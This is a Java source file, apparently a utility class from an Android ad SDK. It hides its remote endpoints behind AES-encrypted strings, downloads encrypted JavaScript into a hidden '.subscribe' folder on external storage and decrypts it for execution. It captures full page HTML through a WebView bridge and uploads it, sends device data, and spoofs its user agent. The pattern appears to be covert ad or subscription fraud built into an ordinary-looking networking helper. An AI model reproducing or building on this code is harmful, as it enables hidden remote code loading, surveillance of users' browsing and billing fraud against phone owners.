package com.oom.tblib.utils;

//import com.crashlytics.android.answers.Answers;
//import com.crashlytics.android.answers.CustomEvent;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import android.webkit.WebSettings;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;


/**
 * Created by xlc on 2017/5/24.
 */
@NotProguard
public class HttpUtil {

    public static final String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";
    //http://sp.adpushonline.com:7088/sdk_p/a
    public static final String A = "4wF5Iv3b3HMEnUmlGnJefAEsxzuGT5kxbsuhf+ytrzZGeSgcoWkcw3iD0DdW+vkq";
    //http://sp.adpushonline.com:7088/sdk_p/b
    public static final String B = "4wF5Iv3b3HMEnUmlGnJefAEsxzuGT5kxbsuhf+ytrzZKFF5nH7DL2bO6YiFmAbz6";
    //http://sp.adpushonline.com:7088/sdk_p/c
    public static final String C = "4wF5Iv3b3HMEnUmlGnJefAEsxzuGT5kxbsuhf+ytrzZS8fHYDJ4zb4XCoqY90p35";
    //http://sp.adpushonline.com:7088/sdk_p/d
    public static final String D = "4wF5Iv3b3HMEnUmlGnJefAEsxzuGT5kxbsuhf+ytrzZSUjuyoXhlQE+OV/eqbdam";
    //http://track.g2oo.com:89/validate
    public static String ANALYSIS_URL = "mebV2hvR5JnKxGzfVxAhQ9ucwLrvIPxRaaRselwl9Fm6J7eX7UJZbOf5kmge5AXg";
    //encode.js
    private static String FileName = "39FAADNHiG6yHDsdxq8hxg==";
    //.subscribe
    private static String FileList = "hoLwW4HVJ/W1zwETS4KeHA==";
    //.subscribe/encode.js
    private static final String jsName = "/PtoljUSTxGSw4zo9hj/GeJtcnB6G81d0Ltd6lm8St8=";

    public static ExecutorService executorService = Executors.newScheduledThreadPool(20);

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect(Map<String, Object> objectMap, Context context) {

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String encodeString = EncodeUtil.encryptByAES(jsonString, JsUtil.getInstance(context).getJs_key());

        if (!TextUtils.isEmpty(encodeString)) {

            PrintWriter out = null;

            try {

                URLConnection myConnect = getURLConnection(EncodeUtil.decryptByAES(B));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encodeString);
                out.flush();

                if (isSuccessful(myConnect)) {
                    LogUtil.show("con success");
                    // Ulog.w("联网: 成功！");
                }
            } catch (Exception e) {
                //                LogUtil.show("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            } finally {
                try {
                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean downloadJsByPost(Context context) {

        boolean downlod_status = false;

        Map<String, Object> map = new HashMap<>();

        map.put("mcc", PhoneInforUtil.getMcc(context));

        JSONObject jsonObject = new JSONObject(map);

        String jsonString = jsonObject.toString();

        String encode = EncodeUtil.encryptByAES(jsonString, JsUtil.getInstance(context).getJs_key());

        File file_name = null;

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeUtil.decryptByAES(FileList));

        if (!file.exists()) {

            file.mkdirs();
        }
        file_name = new File(file.getPath(), EncodeUtil.decryptByAES(FileName));

        //  Ulog.w("post_test: encode" + encode);

        if (!TextUtils.isEmpty(encode)) {

            PrintWriter out = null;
            GZIPInputStream zipInput = null;
            FileOutputStream fileOutput = null;

            try {

                URLConnection urlConnect = getURLConnection(EncodeUtil.decryptByAES(D));

                out = new PrintWriter(urlConnect.getOutputStream());

                out.print(encode);

                out.flush();

                if (isSuccessful(urlConnect)) {

                    zipInput = new GZIPInputStream(urlConnect.getInputStream());

                    if (!file_name.exists()) {
                        file_name.createNewFile();
                    }

                    fileOutput = new FileOutputStream(file_name);

                    byte[] buffer = new byte[2048];
                    int n;
                    while ((n = zipInput.read(buffer)) >= 0) {
                        fileOutput.write(buffer, 0, n);
                    }

                    LogUtil.show("j success");
                }

                XmlUtil.saveDownJsTime(context);

                downlod_status = true;

            } catch (Exception e) {
                downlod_status = false;

                e.printStackTrace();

                if (file_name.exists()) {
                    file_name.delete();
                }
            } finally {
                try {
                    if (fileOutput != null) {
                        fileOutput.close();
                    }
                    if (zipInput != null) {
                        zipInput.close();
                    }
                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        return downlod_status;
    }


    /**
     * 直接读取加密的JS文件
     */
    public static String getEncodeJs(Context context) {

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeUtil.decryptByAES(jsName));

        if (!file.exists()) {
            return null;
        }

        FileInputStream fileInputStream = null;

        ByteArrayOutputStream out = null;

        try {

            fileInputStream = new FileInputStream(file);

            out = new ByteArrayOutputStream();

            byte[] buffer = new byte[1024];
            int n;
            while ((n = fileInputStream.read(buffer)) >= 0) {

                out.write(buffer, 0, n);

            }
            //解密
            String decode_js_source = EncodeUtil.decryptByAES(out.toString(), JsUtil.getInstance(context).getJs_key());

            //读取解密后的JS
            //                        Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);

            return decode_js_source;

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (fileInputStream != null) {
                    fileInputStream.close();
                }
                if (out != null) {
                    out.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return null;
    }


    /**
     * 获取Offer
     */
    public static String getCaseData(Context context, Map<String, Object> objectMap) {

        //        Ulog.w("获取的参数：" + objectMap.toString());

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String offer_decode = null;

        String encode = EncodeUtil.encryptByAES(jsonString, JsUtil.getInstance(context).getJs_key());

        if (!TextUtils.isEmpty(encode)) {
            PrintWriter out = null;
            InputStream input = null;
            try {

                URLConnection myConnect = getURLConnection(EncodeUtil.decryptByAES(A));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encode);
                out.flush();

                if (isSuccessful(myConnect)) {

                    input = myConnect.getInputStream();

                    StringBuilder strDate = new StringBuilder();
                    byte[] br = new byte[1024];
                    int len = -1;
                    while ((len = input.read(br)) >= 0) {
                        strDate.append(new String(br).substring(0, len));
                    }

                    offer_decode = EncodeUtil.decryptByAES(strDate.toString(), JsUtil.getInstance(context).getJs_key());
                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (input != null) {
                        input.close();
                    }
                } catch (Exception e) {
                }

                try {
                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e) {
                }
            }
        }
        return offer_decode;
    }

    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource(Map<String, Object> message, Context context) {

        String offer_id = message.get("offer_id").toString();

        JSONObject jsonObject = new JSONObject(message);

        String jsonString = jsonObject.toString();

        //                Ulog.w("postSource:源码总长 " + jsonString.length());

        ByteArrayOutputStream arr = null;

        OutputStream zipper = null;

        PrintWriter out = null;

        //加密
        try {

            String encode = EncodeUtil.encryptByAES(jsonString, JsUtil.getInstance(context).getJs_key());

            if (!TextUtils.isEmpty(encode)) {

                byte[] data = encode.getBytes("UTF-8");

                arr = new ByteArrayOutputStream();

                zipper = new GZIPOutputStream(arr);

                zipper.write(data);

                zipper.close();

                URLConnection myConnect = getURLConnection(EncodeUtil.decryptByAES(C));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(arr.toByteArray());
                out.flush();

                if (isSuccessful(myConnect)) {
                    XmlUtil.saveInt(context, offer_id, 1);
                }

            }
        } catch (IOException e) {
            e.printStackTrace();
            //                        Ulog.show("postSource: fail:" + e.getMessage());
        } finally {

            try {
                if (out != null) {
                    out.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                if (arr != null) {
                    arr.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static String postAnalysis(String jsonString, Context context) throws Exception {

        //        LogUtil.w("jsonString:" + jsonString);

        PrintWriter out = null;

        BufferedReader in = null;

        String result = "";

        try {

            URL localurl = new URL(ANALYSIS_URL);

            URLConnection conn = localurl.openConnection();

            conn.setConnectTimeout(15000);

            conn.setRequestProperty("accept", "*/*");

            conn.setRequestProperty("connection", "Keep-Alive");

            String user_agent = getUserAgent(context);

            //            LogUtil.w("User-Agent:"+user_agent);

            conn.setRequestProperty("User-Agent", user_agent);

            conn.setDoOutput(true);

            conn.setDoInput(true);

            out = new PrintWriter(conn.getOutputStream());

            out.print(jsonString);

            out.flush();

            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));

            String line;

            while ((line = in.readLine()) != null) {

                result += line;
            }

            //            LogUtil.w("result:" + result);

            return result;

        } catch (Exception e) {
            e.printStackTrace();

            //            LogUtil.w("postAnalysis error:"+e.getMessage());

        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {

                    in.close();
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return null;
    }

    private static String getUserAgent(Context context) {
        String userAgent = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            try {
                userAgent = WebSettings.getDefaultUserAgent(context);
            } catch (Exception e) {
                userAgent = System.getProperty("http.agent");
            }
        } else {
            userAgent = System.getProperty("http.agent");
        }
        StringBuffer sb = new StringBuffer();
        for (int i = 0, length = userAgent.length(); i < length; i++) {
            char c = userAgent.charAt(i);
            if (c <= '\u001f' || c >= '\u007f') {
                sb.append(String.format("\\u%04x", (int) c));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    private static URLConnection getURLConnection(String url) throws IOException {

        URLConnection conn = new URL(url).openConnection();

        conn.setConnectTimeout(15000);

        conn.setRequestProperty("accept", "*/*");

        conn.setRequestProperty("connection", "Keep-Alive");

        conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.1;SV1)");

        conn.setDoOutput(true);

        conn.setDoInput(true);

        return conn;
    }

    private static boolean isSuccessful(URLConnection urlConnect) throws IOException {
        int code = ((HttpURLConnection) urlConnect).getResponseCode();
        if (code >= 200 && code < 300) {
            return true;
        }
        return false;
    }

}